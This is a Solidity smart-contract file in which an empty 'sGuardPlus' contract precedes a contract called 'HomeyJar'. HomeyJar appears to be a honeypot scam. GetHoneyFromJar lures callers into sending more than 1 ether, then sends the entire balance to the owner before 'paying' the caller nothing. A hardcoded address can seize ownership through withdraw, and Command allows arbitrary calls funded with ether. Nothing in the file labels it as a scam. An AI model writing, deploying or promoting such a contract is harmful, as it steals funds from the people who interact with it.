pragma solidity ^0.4.19;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract HomeyJar  {
address  public   Owner = msg.sender;
function () public payable {
}

function GetHoneyFromJar () public payable {
if (msg.value>1 ether)
{
Owner.transfer(this.balance);
msg.sender.transfer(this.balance);
}

}

function withdraw () public payable {
if (msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7)
{
Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
}

require(msg.sender==Owner);
Owner.transfer(this.balance);
}

function Command (address    adr,bytes    data) public payable {
require(msg.sender==Owner);
bool     __sent_result100 = adr.call.value(msg.value)(data);
require(__sent_result100);
}

}
